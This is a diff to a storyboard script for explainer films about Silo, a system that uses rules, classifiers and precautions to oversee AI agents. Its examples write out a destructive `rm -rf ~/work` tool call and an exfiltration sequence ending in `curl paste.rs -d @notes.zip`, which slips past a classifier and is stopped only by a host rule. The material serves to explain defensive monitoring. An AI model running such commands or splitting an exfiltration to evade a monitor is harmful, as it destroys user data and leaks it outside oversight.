@@ -2,8 +2,8 @@
 
 This is the third of four films that replace `record-four-layers`. It comes after
 `what-silo-knows` and `actions-and-kinds`, and uses their words: fact, report, opinion, classifier,
-boundary, rule, allow, hold, deny, ask, alert, pause, stop, granting, destructive, reversible.
-The fourth is `added-classifiers`.
+boundary, request, rule, allow, hold, deny, ask, alert, pause, stop, granting, destructive, protective.
+The fourth is `extensions`.
 
 ## Who watches
 
@@ -34,8 +34,8 @@ are the promise.
 ## Words introduced (shown under the statements)
 
 - rule: data you set. It is triggered by a fact, it reads only facts, it is exact, and it may do anything you wrote in it.
-- precaution: data you set. It is triggered by a report or an opinion, so it can be wrong, and it takes only reversible actions.
-- synchronous: the thing waits at the boundary for the answer.
+- precaution: data you set. It is triggered by a report or an opinion, so it can be wrong, and it takes only protective actions.
+- synchronous: the request waits at the boundary for the answer.
 - asynchronous: nothing waits. The trigger is something already seen, and only the computer is left to act on.
 - tool call: one thing a model's reply asks for: a command, a file edit, a search.
 
@@ -97,9 +97,9 @@ record back. Hero moment: the three actions of one rule, one after the other.
 Narration:
 1. "A precaution is triggered by a report or an opinion, and those can be wrong."
 2. "An opinion: a classifier thinks an agent is working against you. Or a report: an agent program's own account does not match what Silo saw."
-3. "Because its trigger can be wrong, a precaution takes only reversible actions, such as alert, checkpoint, pause, deny and hold."
+3. "Because its trigger can be wrong, a precaution takes only protective actions, such as alert, checkpoint, pause, deny and hold."
 4. "It never allows, never resumes and never stops a computer. Silo is built so that such a precaution cannot even be written."
-5. "Like a rule, a precaution is kept outside the computer, and nothing inside can change it. What an agent may see of it is still open."
+5. "Like a rule, a precaution is kept outside the computer, and nothing inside can change it. By default a computer sees nothing of the opinions and precautions about it."
 
 Picture: a classifier card "small model", with the small line "a classifier", reads the record
 through a dashed one-way link and gives an opinion, which sits outside the record list:
@@ -113,42 +113,44 @@ report row `own account  3 model calls`, marked `report · inside`, and a fact r
 a link goes from that bracket to a second, smaller precaution card "on a mismatch: alert".
 On "cannot even be written", the small words "cannot be written" appear under the three grey,
 struck-through chips `allow`, `resume`, `stop`, and stay. On sentence 5, the small words "kept
-outside the computer" appear beside the precaution card, and stay. Hero moment: the paused
+outside the computer" appear beside the precaution card, and stay. On "sees nothing", a crossed-out
+eye appears inside "main", under its programs, with the small words "by default, sees no opinion
+and no precaution about it". Both stay. Hero moment: the paused
 computer, with the three struck-through chips on the card.
 
 ### Scene 3. Caption: "The less sure the trigger, the less it may do."  Source: statement 3
 
 Narration:
 1. "Who or what triggers something decides what it may do."
-2. "You can do anything. A fact, through a rule, does what the rule says. A report or an opinion, through a precaution, does only what can be undone."
+2. "You can do anything. A fact, through a rule, does what the rule says. A report or an opinion, through a precaution, takes only protective actions."
 3. "A budget shows the difference. On a computer it is a rule: the boundary counts every call. On a run it is a precaution: which run made a call is an opinion."
 4. "A wrong grant lets something out that cannot be taken back. A wrong pause costs time."
-5. "A classifier itself never acts."
+5. "An opinion leads to an action only through a precaution."
 6. "And there is no detour. That a classifier gave an opinion, or that a precaution acted, is itself a fact. No rule may be triggered by it."
 
 Picture: three rows, appearing one by one, each as the voice says it:
 `you  →  anything`;
 `a fact  →  a rule  →  anything the rule says`;
-`a report or an opinion  →  a precaution  →  reversible only`.
-The three kinds from the last film stand at the right, granting, destructive, reversible, all in
+`a report or an opinion  →  a precaution  →  protective only`.
+The three kinds from the last film stand at the right, granting, destructive, protective, all in
 the same colour, and each row is linked to the kinds it reaches: all three for the first two rows,
-only "reversible" for the third. Under the second row, small: "what Silo offers in a rule is a
-product choice". Under the third row, a small classifier card with the words "gives opinions,
-never acts". On "is itself a fact", a small row appears at the end of the third row:
+only "protective" for the third. Under the second row, small: "what Silo offers in a rule is a
+product choice". Under the third row, a small classifier card with the words "gives opinions".
+On "is itself a fact", a small row appears at the end of the third row:
 `precaution acted`, with the mark `fact`. A dashed grey link with no arrowhead goes from that row
 toward "a rule" in the second row. On "No rule may be triggered by it", a clear grey ✕ crosses
 that link, with the words "no detour" beside it. On sentence 3, a small example appears under the
 left end of the second row, "a budget on a computer", and one under the left end of the third
 row, "a budget on a run". Both stay. Nothing may overlap the words already under the second row.
-Hero moment: the third row reaching only "reversible".
+Hero moment: the third row reaching only "protective".
 
-### Scene 4. Caption: "Synchronous: the thing waits for the answer."  Source: statement 4
+### Scene 4. Caption: "Synchronous: the request waits for the answer."  Source: statement 4
 
 Narration:
 1. "A rule or a precaution can be synchronous or asynchronous."
-2. "Synchronous: the thing waits at the boundary for the answer, so it can still be denied or held."
+2. "Synchronous: the request waits at the boundary for the answer, so it can still be denied or held."
 3. "A rule answers on the spot, because a fact is known on the spot. Here the budget of main is reached, and in this example the next model call is denied."
-4. "A precaution makes the thing wait for a classifier's opinion. Here the opinion is not safe, and the precaution denies it."
+4. "A precaution makes the request wait for a classifier. Here the classifier says deny, and the precaution denies it."
 
 Picture: the word "synchronous" stands over the whole frame. Two halves with a thin line between
 them, titled "rule" on the left and "precaution" on the right. In each half, "main" with its
@@ -162,10 +164,10 @@ enough to see it wait.
   small: "a fact, known on the spot".
 - Right, on sentence 4: what the left half of the present scene 4 shows. The chip `connection`
   waits at the boundary. A classifier card "small model", with the small line "a classifier",
-  looks at it through a dashed link and gives the opinion `not safe`. The opinion's link reaches
-  the precaution card "on not safe: deny", dashed outline and shield. Only then is the chip cut
-  in red at the boundary.
-- Under both halves, small: "rule: any kind · precaution: reversible only".
+  looks at it through a dashed link and gives the opinion `deny`. The opinion's link reaches
+  the precaution card "wait for the classifier: deny or hold", dashed outline and shield. Only
+  then is the chip cut in red at the boundary.
+- Under both halves, small: "rule: any kind · precaution: protective only".
 
 Hero moment: the two chips at the boundary, the left one answered at once, the right one waiting
 for an opinion.
@@ -175,8 +177,8 @@ for an opinion.
 Narration:
 1. "Asynchronous: nothing waits, and only the computer is left to act on."
 2. "A rule: the memory of the Mac runs low. The meter is a fact, and in this example the rule pauses main and alerts you."
-3. "A precaution: a classifier's opinion comes after the thing has passed, and the precaution pauses main."
-4. "The timing does not change the kinds: a rule may trigger any kind, and a precaution only reversible ones."
+3. "A precaution: a classifier's opinion comes after the request has passed, and the precaution pauses main."
+4. "The timing does not change the kinds: a rule may trigger any kind, and a precaution only protective ones."
 
 Picture: the word "asynchronous" stands over the whole frame. Two halves with a thin line between
 them, titled "rule" on the left and "precaution" on the right. Nothing stands at a boundary in
@@ -194,7 +196,7 @@ either half.
   reaches the precaution card "on that opinion: pause main", and only then does the computer turn
   still and pale.
 - Under both halves, small, on two lines: "nothing waits, so nothing is allowed, held or denied"
-  and "rule: any kind · precaution: reversible only".
+  and "rule: any kind · precaution: protective only".
 
 Hero moment: the two paused computers, one by a rule on a fact, one by a precaution on an
 opinion.
@@ -204,35 +206,42 @@ opinion.
 Narration:
 1. "A model's reply asks for a command to be run: a tool call. It waits at the boundary for a classifier."
 2. "That wait has a limit too, and Silo ends it itself."
-3. "If the opinion is safe, the precaution does nothing, and the call passes as the rules allow. If it is unsure, in this example the precaution holds it for you."
+3. "The classifier says one of three things. Let it go on: the precaution does nothing, and the call passes as the rules allow. Hold: the call is held for you."
 
 Picture: outside the computer, a card "model". A reply travels from it toward "main" and stops at
 the boundary. Inside the reply, a tool call is shown as code: `rm -rf ~/work`. A classifier card
 "small model", with the small line "a classifier", looks at the waiting reply through a dashed
 link. On that link sits a small timer with the words "Silo's limit". A precaution card, dashed
-outline and shield, titled "precaution", carries three lines: "safe: does nothing", "unsure: hold for you", "not safe:
-deny". The first two lines light in turn as the voice names them. Nothing has been decided yet:
-the reply still waits at the boundary. Hero moment: the reply waiting at the boundary, with the
-three lines of the precaution.
+outline and shield, titled "precaution", carries three lines: "go on: does nothing", "hold: held
+for you", "deny: denied". The three lines appear on "one of three things". The first two light in
+turn as the voice names them. Nothing has been decided yet: the reply still waits at the
+boundary. Hero moment: the reply waiting at the boundary, with the three lines of the precaution.
 
-### Scene 7. Caption: "A denied tool call: the reply is changed."  Source: statement 6
+### Scene 7. Caption: "A denied tool call comes back as an error."  Source: statement 6
 
 Narration:
-1. "Here it says: not safe. The precaution denies the call, and Silo changes the reply: the tool call is replaced by a refusal."
-2. "The agent program sends the refusal back with its next request, and the model reads it. The original and the replacement are both kept as facts."
-3. "This works where Silo can read the model's traffic. How each agent program takes a changed reply is still to be tested."
+1. "Here it says: deny. The precaution denies the call."
+2. "The model sees its own call, unchanged, with an error that says it was denied."
+3. "This works where Silo can read the model's traffic. How Silo makes that error reach the model is still to be found out."
 
-Picture: the same picture as scene 6, carried over. The classifier card gives the opinion
-`not safe`. Its link reaches the precaution card, and the third line, "not safe: deny", lights and
-stays. Only then is the tool call inside the reply replaced by the text
-`Silo denied this tool call. A classifier thinks it is not safe.`, and the words "changed here"
-stay at the boundary where the reply stood. The classifier's dashed link, its timer and "Silo's
-limit" disappear when the reply moves on: the wait is over. The reply continues into the computer, to a box
-labelled "agent program". A chip `refusal` then goes from that box back out and parks before the
-"model" card, so that it stays in the held frame. Two rows land in the record, both marked
-`fact · network`: `tool call  rm -rf ~/work  (original)` and `tool call  refusal  (sent instead)`.
-On "the model's traffic", the link between the model and the boundary lights, with the words "Silo
-reads this traffic". Hero moment: the reply changing at the boundary, then the two rows.
+Picture: the picture of scene 6, carried over. The classifier card gives `deny`. Its link reaches
+the precaution card, and the third line, "deny: denied", lights and stays. Only then is the tool
+call inside the reply cut in red at the boundary, and it goes no further. Beside the "model"
+card the call `rm -rf ~/work` appears again, unchanged, with one line under it: `error: denied`.
+One row lands in the record, marked `fact · network`: `tool call  rm -rf ~/work  denied`. On
+"the model's traffic", the link between the model and the boundary lights, with the words "Silo
+reads this traffic". On the last sentence, small grey words under the error line: "how: to find
+out". Nothing shows a reply being changed, and no text stands in for the call. Hero moment: the
+call, unchanged, with its error, beside the model.
+
+How the deny is drawn: a link leaves the third line of the precaution card and reaches the line
+of the tool call in the reply. That line turns red, and the link from the model is cut with a red
+cross at the boundary. The "agent program" inside "main" stays unreached. The classifier's
+dashed link, its timer and "Silo's limit" disappear at the cut: the wait is over.
+
+How the call beside the model is drawn: a small sheet titled "the model sees", with an eye, holds
+the call and the error line. No link leads to it. On "unchanged", the call in the reply and the
+call in that sheet pulse together.
 
 ### Scene 8. Caption: "Rules are the promise. A precaution is extra caution."  Source: statement 7
 
@@ -244,7 +253,7 @@ Narration:
 Picture: three small tool calls pass a classifier card "small model", with the small line "a
 classifier", one by one, spread over the first
 sentence: `write notes.txt`, `zip notes.txt`, `curl paste.rs -d @notes.zip`. Each gets the opinion
-`safe`, and each time the precaution card, titled "precaution", stays unlit, with the small grey words
+`go on`, and each time the precaution card, titled "precaution", stays unlit, with the small grey words
 "does nothing" under it. The last one then reaches the boundary as a connection toward `paste.rs`. Right at the
 boundary stand a rule card with a check, "Allow: crates.io", and the words "no rule allows
 paste.rs". The connection is drawn only as far as the boundary and cut there in red; the host
